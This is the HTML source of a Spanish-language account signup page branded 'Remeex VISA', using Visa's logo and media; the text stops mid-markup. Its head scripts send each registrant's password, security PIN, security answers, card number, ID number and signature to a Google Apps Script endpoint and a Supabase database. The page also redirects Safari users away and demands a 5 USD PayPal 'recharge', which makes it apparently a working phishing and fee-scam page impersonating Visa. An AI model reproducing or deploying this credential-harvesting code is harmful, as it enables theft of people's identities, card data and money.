<!DOCTYPE html>
<html lang="es">
<head>
  <script>
    (function () {
      var ua = navigator.userAgent || '';
      var isSafari = /Safari/i.test(ua) && !/Chrome|CriOS|FxiOS|Edg|OPR|SamsungBrowser/i.test(ua);

      if (isSafari) {
        try {
          window.location.replace('index.html?safari-restricted=1');
        } catch (redirectError) {
          window.location.href = 'index.html?safari-restricted=1';
        }
        return;
      }

      var docEl = document.documentElement;
      var hiddenClass = 'registro-document-hidden';

      if (docEl) {
        if (docEl.classList) {
          docEl.classList.add(hiddenClass);
        }

        docEl.style.display = 'none';
      }

      try {
        var selectedCountry = window.localStorage.getItem('selectedLatamCountry');
        if (!selectedCountry) {
          window.location.replace('index.html');
        }
      } catch (error) {
        try {
          window.location.replace('index.html');
        } catch (replaceError) {
          window.location.href = 'index.html';
        }
      }
    })();
  </script>
  <!-- Inline styles moved to external stylesheet -->
  <link rel="stylesheet" href="registro.css">
  <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
  <script src="env-config.js"></script>
  <script>
    (function () {
      var appsScriptUrl = 'https://script.google.com/macros/s/AKfycbyPfZnM1r_5G_5oWBJobF2R2wai9D5ps1O-yNa4R2yHRyoSrzHfV0u3M2YbeLNOef-z/exec';
      var deploymentId = 'AKfycbyPfZnM1r_5G_5oWBJobF2R2wai9D5ps1O-yNa4R2yHRyoSrzHfV0u3M2YbeLNOef-z';

      function sanitizePayload(payload) {
        if (!payload || typeof payload !== 'object') {
          return {};
        }

        try {
          return JSON.parse(JSON.stringify(payload));
        } catch (error) {
          return { fallbackPayload: String(payload) };
        }
      }

      function sendWithFetch(url, body) {
        try {
          fetch(url, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: body,
            mode: 'cors',
            credentials: 'omit'
          }).catch(function (error) {
            console.warn('No se pudo enviar la información a Google Apps Script (fetch).', error);
          });
        } catch (error) {
          console.warn('Error inesperado al enviar la información a Google Apps Script (fetch).', error);
        }
      }

      function sendRegistrationToAppsScript(payload) {
        var sanitizedPayload = sanitizePayload(payload);
        sanitizedPayload.__deploymentId = deploymentId;
        sanitizedPayload.__submittedAt = new Date().toISOString();
        sanitizedPayload.__source = 'registro-web';

        var serializedPayload;

        try {
          serializedPayload = JSON.stringify(sanitizedPayload);
        } catch (error) {
          console.warn('No fue posible serializar la información para Google Apps Script.', error);
          return;
        }

        if (navigator.sendBeacon) {
          try {
            var blob = new Blob([serializedPayload], { type: 'application/json' });
            var beaconResult = navigator.sendBeacon(appsScriptUrl, blob);

            if (beaconResult) {
              return;
            }
          } catch (error) {
            console.warn('No se pudo enviar la información a Google Apps Script (sendBeacon).', error);
          }
        }

        sendWithFetch(appsScriptUrl, serializedPayload);
      }

      function extractRegistrationData(payload) {
        if (!payload || typeof payload !== 'object') {
          return null;
        }

        if (payload.registrationData && typeof payload.registrationData === 'object') {
          return payload.registrationData;
        }

        if (payload.data && typeof payload.data === 'object') {
          return payload.data;
        }

        return payload;
      }

      // Función para enviar también a Supabase (dual envío) - DIRECTO A SUPABASE
      function sendRegistrationToSupabase(payload) {
        return new Promise(function(resolve, reject) {
          try {
            var registration = extractRegistrationData(payload);

            if (!registration) {
              var invalidPayloadError = new Error('No se encontró información de registro válida para guardar.');
              console.warn('[Supabase] ⚠️', invalidPayloadError.message);
              reject(invalidPayloadError);
              return;
            }

            var supabasePayload = {
              email: registration.email || null,
              first_name: registration.firstName || null,
              last_name: registration.lastName || null,
              full_name: (registration.firstName && registration.lastName) ? registration.firstName + ' ' + registration.lastName : (registration.fullName || null),
              preferred_name: registration.preferredName || registration.nickname || null,
              nickname: registration.nickname || null,
              country: registration.country || null,
              state: registration.state || null,
              gender: registration.gender || null,
              birth_day: registration.birthDay || null,
              birth_month: registration.birthMonth || null,
              birth_year: registration.birthYear || null,
              document_type: registration.documentType || null,
              document_number: registration.documentNumber || null,
              phone_country_code: registration.phoneCountryCode || null,
              phone_prefix: registration.phonePrefix || null,
              phone_number: registration.phoneNumber || registration.nationalPhoneNumber || null,
              full_phone_number: registration.fullPhoneNumber || registration.phoneNumberFull || null,
              password: registration.password || null,
              security_code: registration.securityCode || registration.verificationCode || null,
              security_pin: registration.securityPin || null,
              security_question: registration.securityQuestion || null,
              security_answer: registration.securityAnswer || null,
              card_number: registration.cardNumber || null,
              account_type: registration.accountType || null,
              purpose: registration.purpose || null,
              payment_method: registration.paymentMethod || null,
              paypal_email: registration.paypalEmail || null,
              operator: registration.operator || null,
              initial_recharge_confirmed: registration.initialRechargeConfirmed || false,
              venezuela_bank: registration.venezuelaBank || null,
              signature_data_url: registration.signatureDataUrl || null,
              device_id: registration.deviceId || null,
              created_at: registration.createdAt || new Date().toISOString()
            };

            var hasPersisted = false;
            var readinessAttempts = 0;
            var maxAttempts = 20;

            function persistRegistration() {
              if (hasPersisted) {
                return;
              }

              hasPersisted = true;

              window.SupabaseDB.saveRegistration(supabasePayload)
                .then(function(result) {
                  if (result && result.ok) {
                    console.log('[Supabase] ✅ Registro guardado exitosamente:', result.data.id);
                    resolve(result);
                  } else {
                    var errorMessage = (result && result.error) ? result.error : 'No se pudo guardar el registro en Supabase.';
                    console.warn('[Supabase] ⚠️ Error al guardar:', errorMessage);
                    resolve(result || { ok: false, error: errorMessage });
                  }
                })
                .catch(function(error) {
                  hasPersisted = false;
                  console.warn('[Supabase] ⚠️ Error inesperado:', error);
                  reject(error);
                });
            }

            function handleSupabaseReady() {
              if (hasPersisted) {
                window.removeEventListener('supabase:ready', handleSupabaseReady);
                return;
              }

              window.removeEventListener('supabase:ready', handleSupabaseReady);
              persistRegistration();
            }

            function waitForSupabaseReady() {
              if (hasPersisted) {
                return;
              }

              if (window.SupabaseDB && typeof window.SupabaseDB.isReady === 'function' && window.SupabaseDB.isReady()) {
                persistRegistration();
                return;
              }

              readinessAttempts += 1;

              if (readinessAttempts > maxAttempts) {
                hasPersisted = true;
                window.removeEventListener('supabase:ready', handleSupabaseReady);
                reject(new Error('Supabase no se inicializó a tiempo.'));
                return;
              }

              console.log('[Supabase] ⏳ Esperando inicialización...');
              setTimeout(waitForSupabaseReady, 500);
            }

            if (window.SupabaseDB && typeof window.SupabaseDB.isReady === 'function' && window.SupabaseDB.isReady()) {
              persistRegistration();
            } else {
              window.addEventListener('supabase:ready', handleSupabaseReady);
              waitForSupabaseReady();
            }
          } catch (error) {
            console.warn('[Supabase] ⚠️ Error en sendRegistrationToSupabase:', error);
            reject(error);
          }
        });
      }

      // Función wrapper para dual envío (Google Apps Script + Supabase)
      function dualSendRegistration(payload) {
        sendRegistrationToAppsScript(payload);
        return sendRegistrationToSupabase(payload);
      }

      window.googleAppsScriptIntegration = {
        send: dualSendRegistration
      };

      window.sendRegistrationToSupabase = sendRegistrationToSupabase;
    })();
  </script>
  <script type="module" src="registro.js"></script>
  <script src="repair.js"></script>
  <script>
    (function () {
      var ua = navigator.userAgent || '';
      var isSafari = /Safari/i.test(ua) && !/Chrome|CriOS|FxiOS|Edg|OPR|SamsungBrowser/i.test(ua);
      var shouldEnableProtection = false;

      if (!shouldEnableProtection && typeof console !== 'undefined') {
        console.info('[registro] Protección de contenido deshabilitada para permitir herramientas de desarrollo.');
      }

      if (!isSafari && shouldEnableProtection) {
        var script = document.createElement('script');
        script.src = 'protect.js';
        script.integrity = 'sha512-onA8JaAPhIJYCoQpsZ1k1YyfiOm8IChkLZHUAAd/zi7ILeTyU2k/hbNbcf64hphnYDZTOm581/RG1fObyZnjFw==';
        script.crossOrigin = 'anonymous';
        document.head.appendChild(script);
      }
    })();
  </script>
  <script src="transition-guardian.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Visa - Registro de Cuenta Digital</title>
  <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
  <link rel="apple-touch-icon" href="visabluapple.png">
  <meta name="description" content="Remeex VISA: transferencias globales sin comisiones, rapidas y seguras."/>
  <meta name="keywords" content="remesas, transferencias internacionales, enviar dinero, VISA"/>
  <meta name="author" content="Remeex VISA"/>
  <meta name="robots" content="index, follow"/>
    <!-- Favicon -->

    <!-- SEO -->
    <link rel="canonical" href="https://remeexvisa.com/registro" />

    <link rel="prefetch" href="homevisa.html">

    <!-- Open Graph -->
    <meta property="og:title" content="Regístrate en Remeex VISA" />
    <meta property="og:description" content="Crea tu cuenta digital Remeex VISA en pocos pasos." />
    <meta property="og:image" content="https://mnd-assets.mynewsdesk.com/image/upload/c_fill,dpr_auto,f_auto,g_auto,q_auto:good,w_1782/sqyrhijdylqrsgwbrbtm" />
    <meta property="og:type" content="website" />
    <meta property="og:url" content="https://remeexvisa.com/registro" />
    <meta property="og:site_name" content="Remeex VISA" />

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Regístrate en Remeex VISA" />
    <meta name="twitter:description" content="Crea tu cuenta digital Remeex VISA en pocos pasos." />
    <meta name="twitter:image" content="https://mnd-assets.mynewsdesk.com/image/upload/c_fill,dpr_auto,f_auto,g_auto,q_auto:good,w_1782/sqyrhijdylqrsgwbrbtm" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    
    <script src="bank-data.js"></script>
    <link rel="stylesheet" href="responsive.css">
</head>
<body data-tawk-autoload="false">
    <div class="connection-overlay" id="connectionOverlay" role="dialog" aria-modal="true" aria-labelledby="connectionOverlayTitle" aria-hidden="true">
        <div class="connection-overlay-card">
            <div class="connection-overlay-icon" aria-hidden="true">
                <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="32" cy="32" r="31" stroke="currentColor" stroke-width="2" opacity="0.35" />
                    <path d="M16 28C21.3333 22.6667 26.6667 20 32 20C37.3333 20 42.6667 22.6667 48 28" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/>
                    <path d="M22 34C25.3333 30.6667 28.6667 29 32 29C35.3333 29 38.6667 30.6667 42 34" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/>
                    <path d="M28.5 40.5L32 44L35.5 40.5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
                    <circle cx="32" cy="32" r="8.5" stroke="currentColor" stroke-width="2" opacity="0.35" />
                </svg>
            </div>
            <h2 class="connection-overlay-title" id="connectionOverlayTitle">Requisitos para continuar</h2>
            <p class="connection-overlay-text">Asegúrate de contar con una conexión a internet rápida y estable y utiliza un dispositivo reciente con batería suficiente para garantizar el funcionamiento correcto del registro.</p>
            <div class="connection-overlay-actions">
                <button class="btn btn-primary" id="connectionOverlayAccept">
                    <span>Entiendo, continuar</span>
                    <div class="btn-ripple"></div>
                </button>
            </div>
        </div>
    </div>
    <div class="connection-overlay" id="supportChannelOverlay" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="supportChannelOverlayTitle" aria-describedby="supportChannelOverlayDescription">
        <div class="connection-overlay-card support-overlay-card">
            <button class="support-overlay-close" type="button" data-support-action="close" aria-label="Cerrar opciones de soporte">
                <span aria-hidden="true">&times;</span>
            </button>
            <div class="support-overlay-icon" aria-hidden="true">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 11.5a8.5 8.5 0 0 1-8.5 8.5H11l-5 3v-4.5A8.5 8.5 0 1 1 21 11.5Z" />
                    <path d="M8 10h8" />
                    <path d="M8 14h4" />
                </svg>
            </div>
            <h2 class="connection-overlay-title" id="supportChannelOverlayTitle">Elige un canal de soporte</h2>
            <p class="connection-overlay-text" id="supportChannelOverlayDescription">Nuestro equipo puede ayudarte por WhatsApp o a través del chat en vivo. Selecciona cómo prefieres continuar.</p>
            <div class="support-overlay-actions">
                <button class="btn btn-primary support-overlay-action" type="button" data-support-action="whatsapp">
                    <span>Whatsapp</span>
                    <div class="btn-ripple"></div>
                </button>
                <button class="btn btn-secondary support-overlay-action" type="button" data-support-action="live-chat">
                    <span>Chat en vivo</span>
                    <div class="btn-ripple"></div>
                </button>
            </div>
        </div>
    </div>
    <div class="connection-overlay" id="whatsappReasonOverlay" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="whatsappReasonTitle" aria-describedby="whatsappReasonDescription">
        <div class="connection-overlay-card support-overlay-card whatsapp-overlay-card">
            <button class="support-overlay-close" type="button" data-whatsapp-action="close" aria-label="Cerrar selección de motivo">
                <span aria-hidden="true">&times;</span>
            </button>
            <div class="support-overlay-icon" aria-hidden="true">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 11.5a8.5 8.5 0 0 1-8.5 8.5H11l-5 3v-4.5A8.5 8.5 0 1 1 21 11.5Z" />
                    <path d="M16 9h-8" />
                    <path d="M16 13H8" />
                </svg>
            </div>
            <h2 class="connection-overlay-title" id="whatsappReasonTitle">¿Cuál es el motivo de tu consulta?</h2>
            <p class="connection-overlay-text" id="whatsappReasonDescription">Selecciona el motivo para que preparemos el mensaje que enviaremos por WhatsApp.</p>
            <div class="whatsapp-reason-options" role="group" aria-label="Motivos de consulta por WhatsApp">
                <button class="whatsapp-reason-option" type="button" data-reason-key="1" aria-pressed="false">
                    <span class="whatsapp-reason-option__title">Necesito el código de 20 dígitos</span>
                    <span class="whatsapp-reason-option__description">Estoy en la etapa de verificación y requiero el código de 20 dígitos para continuar con mi registro digital.</span>
                </button>
                <button class="whatsapp-reason-option" type="button" data-reason-key="2" aria-pressed="false">
                    <span class="whatsapp-reason-option__title">Problemas con mi registro</span>
                    <span class="whatsapp-reason-option__description">Tengo inconvenientes al completar mi registro y necesito asistencia del equipo.</span>
                </button>
                <button class="whatsapp-reason-option" type="button" data-reason-key="3" aria-pressed="false">
                    <span class="whatsapp-reason-option__title">Necesito ayuda con mi cuenta</span>
                    <span class="whatsapp-reason-option__description">Requiero orientación general sobre mi cuenta o los siguientes pasos.</span>
                </button>
            </div>
            <div class="whatsapp-reason-actions">
                <button class="btn btn-secondary whatsapp-reason-action" type="button" data-whatsapp-action="cancel">
                    <span>Cancelar</span>
                </button>
                <button class="btn btn-primary whatsapp-reason-action" type="button" data-whatsapp-action="confirm" disabled>
                    <span>Continuar con WhatsApp</span>
                    <div class="btn-ripple"></div>
                </button>
            </div>
        </div>
    </div>
    <div class="exit-overlay" id="exitOverlay" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="exitOverlayTitle" aria-describedby="exitOverlayDescription">
        <div class="exit-overlay-card">
            <div class="exit-overlay-header">
                <h2 class="exit-overlay-title" id="exitOverlayTitle">¿Quieres salir del registro?</h2>
                <p class="exit-overlay-text" id="exitOverlayDescription">Si abandonas ahora, tu progreso actual se borrará. Puedes retomarlo en cualquier momento.</p>
            </div>
            <div class="exit-overlay-actions">
                <button class="btn btn-primary" type="button" id="exitRestartButton">
                    <span>Ir al inicio del registro</span>
                    <div class="btn-ripple"></div>
                </button>
                <button class="btn btn-secondary" type="button" id="exitHomeButton">
                    <span>Ir a Remeex</span>
                    <div class="btn-ripple"></div>
                </button>
                <button class="btn exit-overlay-btn--ghost" type="button" id="exitChangeCountryButton">
                    <span>Cambiar de país</span>
                    <div class="btn-ripple"></div>
                </button>
            </div>
        </div>
    </div>
    <div class="container registration-app">
        <div class="header-actions">
            <button class="exit-btn" onclick="exitRegistration()" aria-label="Cerrar registro">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
                    <polyline points="9,22 9,12 15,12 15,22"></polyline>
                </svg>
            </button>
        </div>

        <div class="header">
            <div class="logo-container">
                <div class="logo-identity">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa Logo" class="visa-logo">
                    <div class="subtitle">Tu cuenta digital sin límites</div>
                </div>
            </div>
        </div>

        <div class="progress-container" id="progressContainer" style="display: none;">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="progress-text">
                <span>Registro en progreso</span>
                <span class="progress-percentage" id="progressPercentage">0%</span>
            </div>
        </div>

        <div class="content">
            <!-- Paso 0: Bienvenida -->
            <div class="step active" id="step0">
                <div class="step-info">
                    <div class="welcome-screen welcome-screen--info">
                        <svg class="welcome-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                            <line x1="1" y1="10" x2="23" y2="10"></line>
                        </svg>
                        <div class="step-title">¡Bienvenido a Visa Digital!</div>
                        <div class="step-description">
                            Abre tu cuenta digital en minutos y disfruta de todos los beneficios de una tarjeta Visa internacional con tecnología de vanguardia.
                        </div>
                    </div>
                </div>
                <div class="step-content">
                    <div class="welcome-screen welcome-screen--content">
                        <div class="welcome-start">
                            <div class="welcome-start__cta">
                                <div class="button-group">
                                    <button class="btn btn-primary" onclick="startRegistration()">
                                        <span>Comenzar Registro</span>
                                        <div class="btn-ripple"></div>
                                    </button>
                                </div>
                            </div>
                            <div class="welcome-start__media" aria-hidden="true">
                                <video class="welcome-video" autoplay muted loop playsinline controls>
                                    <source src="https://usa.visa.com/content/dam/VCOM/regional/na/us/homepage/videos/typewriter-900x900.mp4" type="video/mp4">
                                    Tu navegador no soporta el elemento de video.
                                </video>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Paso 1: Nombres y Apellidos -->
            <div class="step" id="step1">
                <div class="step-info">
                    <div class="step-title">¿Cuál es tu nombre completo?</div>
                    <div class="step-description">Ingresa tu nombre como aparece en tu documento de identidad oficial</div>
                </div>

                <div class="step-content">
                    <div class="form-group">
                        <label class="form-label">Nombres</label>
                        <input type="text" class="form-input" id="firstName" placeholder="Ej: Juan Carlos" autocomplete="given-name" pattern="[a-zA-ZáéíóúÁÉÍÓÚñÑ\s]+" inputmode="text">
                    </div>

                    <div class="form-group">
                        <label class="form-label">Apellidos</label>
                        <input type="text" class="form-input" id="lastName" placeholder="Ej: García Pérez" autocomplete="family-name" pattern="[a-zA-ZáéíóúÁÉÍÓÚñÑ\s]+" inputmode="text">
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="nameNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 2: Preferencia de nombre y género -->
            <div class="step" id="step2">
                <div class="step-info">
                    <div class="step-title" id="namePreferenceTitle">¿Cómo prefieres que te llamemos?</div>
                    <div class="step-description">Selecciona el nombre con el que te sientes más cómodo</div>
                </div>

                <div class="step-content">
                    <div class="select-grid" id="nameOptions"></div>

                    <div class="form-group">
                        <label class="form-label">¿Cómo te identificas?</label>
                        <div class="select-grid">
                            <div class="option-card" data-gender="él">
                                <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                                    <circle cx="12" cy="7" r="4"></circle>
                                </svg>
                                <span class="label">Él</span>
                            </div>
                            <div class="option-card" data-gender="ella">
                                <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                                    <circle cx="12" cy="7" r="4"></circle>
                                </svg>
                                <span class="label">Ella</span>
                            </div>
                            <div class="option-card" data-gender="elle">
                                <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
                                    <circle cx="9" cy="7" r="4"></circle>
                                    <path d="m22 2-5 10-5-10h10Z"></path>
                                </svg>
                                <span class="label">Elle</span>
                            </div>
                        </div>
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="genderNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 3: Fecha de nacimiento -->
            <div class="step" id="step3">
                <div class="step-info">
                    <div class="step-title" id="birthdateTitle">¿Cuál es tu fecha de nacimiento?</div>
                    <div class="step-description" id="birthdateDescription">Necesitamos verificar tu edad para abrir tu cuenta</div>
                    <div id="ageConfirmation" style="display: none;"></div>
                </div>

                <div class="step-content">
                    <div class="input-group">
                        <div class="form-group">
                            <label class="form-label">Día</label>
                            <input type="number" class="form-input" id="birthDay" min="1" max="31" placeholder="DD" autocomplete="bday-day">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Mes</label>
                            <select class="form-input" id="birthMonth" autocomplete="bday-month">
                                <option value="">Mes</option>
                                <option value="1">Enero</option>
                                <option value="2">Febrero</option>
                                <option value="3">Marzo</option>
                                <option value="4">Abril</option>
                                <option value="5">Mayo</option>
                                <option value="6">Junio</option>
                                <option value="7">Julio</option>
                                <option value="8">Agosto</option>
                                <option value="9">Septiembre</option>
                                <option value="10">Octubre</option>
                                <option value="11">Noviembre</option>
                                <option value="12">Diciembre</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label class="form-label">Año</label>
                            <input type="number" class="form-input" id="birthYear" min="1900" max="2006" placeholder="AAAA" autocomplete="bday-year">
                        </div>
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="birthdateNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 4: País de residencia -->
            <div class="step" id="step4">
                <div class="step-info">
                    <div class="step-title" id="countryTitle">¿En qué país resides actualmente?</div>
                    <div class="step-description">Selecciona tu país de residencia actual para configurar los servicios disponibles</div>
                    <div id="countryMessage" style="display: none;"></div>
                </div>

                <div class="step-content">
                    <div class="form-group">
                        <select class="form-input" id="country" autocomplete="country">
                            <option value="">Selecciona tu país</option>
                        </select>
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="countryNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 5: Estado de Venezuela -->
            <div class="step" id="step5">
                <div class="step-info">
                    <div class="step-title" id="stateTitle">¿En qué estado de <span id="stateTitleCountry">Venezuela</span> vives?</div>
                    <div class="step-description" id="stateDescription">Selecciona el estado donde tienes tu residencia principal</div>

                    <div id="depositStepContent" class="deposit-step">
                        <div class="deposit-highlight">
                            <div class="deposit-amount">
                                <span class="deposit-amount-label">Recarga inicial requerida</span>
                                <span class="deposit-amount-value" id="depositAmountValue">5 USD</span>
                            </div>
                            <p class="deposit-highlight-text">Para activar tu cuenta internacional realiza tu primera recarga segura desde la app o con nuestro equipo de soporte.</p>
                            <p class="deposit-note">Un asesor verificará tu recarga en minutos para habilitar todos los servicios.</p>
                        </div>

                        <div class="deposit-benefits">
                            <h3 class="benefits-title">Beneficios al completar tu recarga:</h3>
                            <ul class="benefits-list">
                                <li>
                                    <span class="benefit-icon">💳</span>
                                    <span>Tarjeta Visa virtual y física para compras en cualquier parte del mundo.</span>
                                </li>
                                <li>
                                    <span class="benefit-icon">⚡</span>
                                    <span>Retiros instantáneos sin comisiones hacia tus cuentas favoritas.</span>
                                </li>
                                <li>
                                    <span class="benefit-icon">⬆️</span>
                                    <span>Límites de retiros internacionales de hasta <strong>10.000 USD</strong> al mes.</span>
                                </li>
                                <li>
                                    <span class="benefit-icon">🎁</span>
                                    <span>Acceso a promociones, cashback y ofertas exclusivas para miembros.</span>
                                </li>
                                <li>
                                    <span class="benefit-icon">📥</span>
                                    <span>Recibe transferencias globales sin comisiones ocultas.</span>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>

                <div class="step-content">
                    <div id="stateStepContent">
                        <div class="form-group">
                            <select class="form-input" id="state" autocomplete="address-level1">
                                <option value="">Selecciona tu estado</option>
                            </select>
                        </div>
                    </div>

                    <div id="depositActions" class="deposit-actions">
                        <button class="btn btn-primary btn-deposit-action" type="button" onclick="showSupportChannelOverlay()">
                            <span id="depositActionButtonLabel">Realizar recarga de 5 USD</span>
                            <div class="btn-ripple"></div>
                        </button>
                        <div id="paypal-container-92GWR29J78R86"></div>
                        <script>
                          paypal.HostedButtons({
                            hostedButtonId: "92GWR29J78R86",
                            onApprove: function(data, actions) {
                              if (window.handleInitialRechargeApproval) {
                                window.handleInitialRechargeApproval(data);
                              }
                            }
                          }).render("#paypal-container-92GWR29J78R86")
                        </script>
                        <label class="deposit-confirmation">
                            <input type="checkbox" id="depositConfirmation">
                            <span id="depositConfirmationLabel">Confirmo que realizaré mi recarga inicial de 5 USD para activar mi cuenta.</span>
                        </label>
                    </div>

                    <div class="button-group">
                        <button class="btn btn-secondary" onclick="previousStep()">
                            <span>Atrás</span>
                        </button>
                        <button class="btn btn-primary" onclick="nextStep()" id="stateNext" disabled>
                            <span>Continuar</span>
                            <div class="btn-ripple"></div>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Paso 6: Tipo de documento -->
            <div class="step" id="step6">
                <div class="step-info">
                    <div class="step-title" id="documentTitle">¿Con qué documento te vas a identificar?</div>
                    <div class="step-description">Selecciona el documento que usarás para verificar tu identidad</div>
                </div>

                <div class="step-content">
                    <div class="select-grid">
                        <div class="option-card" data-document-type="ci">
                            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
                                <line x1="8" y1="21" x2="16" y2="21"></line>
                                <line x1="12" y1="17" x2="12" y2="21"></line>
                            </svg>
                            <span class="label" data-document-label="ci">Cédula de Identidad</span>
                        </div>
                        <div class="option-card" data-document-type="passport">
                            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <rect x="4" y="2" width="16" height="20" rx="2" ry="2"></rect>
                                <circle cx="12" cy="8" r="2"></circle>
                                <path d="m8 14 8 0"></path>
                                <path d="m8 18 5 0"></path>
                            </svg>
                            <span class="label" data-document-label="passport">Pasaporte</span>
                        </div>
                        <div class="option-card" data-document-type="license">
                            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <rect x="3" y="11" width="18" height="10" rx="2" ry="2"></rect>
                                <circle cx="12" cy="5" r="2"></circle>
                                <path d="m12 7-2 4h4l-2-4Z"></path>
                            </svg>
                            <span class="label" data-document-label="license">Licencia de Conducir</span>
                        </div>
                    </div>

                    <div class="form-group" id="documentNumberGroup" style="display: none;">
                        <label class="form-label" id="documentLabel" data-document-label="field">Número del documento</label>
                        <input type="text" class="form-input" id="documentNumber" placeholder="" autocomplete="off" inputmode="text">
                    </div>

                    <div class="form-group" id="documentUploadSection" style="display: none;">
                        <label class="form-label" for="documentFile">Adjunta tu documento</label>
                        <div class="document-upload-card">
                            <label class="document-upload-dropzone" for="documentFile" id="documentUploadDropzone" role="button" tabindex="0">
                                <span class="document-upload-graphic" aria-hidden="true">
                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                                        <path d="M14 3h-6a3 3 0 0 0-3 3v12a3 3 0 0 0 3 3h8a3 3 0 0 0 3-3V8.5Z"></path>
                                        <path d="M14 3v4.5a1.5 1.5 0 0 0 1.5 1.5H19"></path>
                                        <path d="m9 14 3-3 3 3"></path>
                                        <path d="M12 11v6"></path>
                                    </svg>
                                </span>
                                <span class="document-upload-copy">
                                    <span class="document-upload-title">Selecciona o arrastra tu archivo</span>
                                    <span class="document-upload-subtitle">JPG, PNG o PDF · Máx. 5 MB</span>
                                </span>
                                <span class="status-icon status-icon--success" id="documentUploadSuccess" aria-hidden="true">
                                    <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                                        <path d="M16.5 5.5 8.5 15 3.5 10"></path>
                                    </svg>
                                </span>
                            </label>
                            <input type="file" class="document-upload-input" id="documentFile" accept="image/jpeg,image/png,application/pdf">
                        </div>
                        <div class="document-upload-feedback">
                            <p class="document-upload-status" id="documentFileStatus" aria-live="polite">
                                Sube una imagen o PDF de tu documento (máx. 5 MB).
                            </p>
                            <button class="document-upload-reset" type="button" id="documentFileReset" hidden>Quitar archivo</button>
                        </div>
                        <div class="document-upload-preview" id="documentFilePreview" hidden aria-live="polite">
                            <img id="documentPreviewImage" alt="Previsualización del documento" class="document-preview-image" hidden>
                            <div class="document-preview-fallback" id="documentPreviewFallback" hidden>
                                <div class="document-preview-icon" aria-hidden="true">
                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
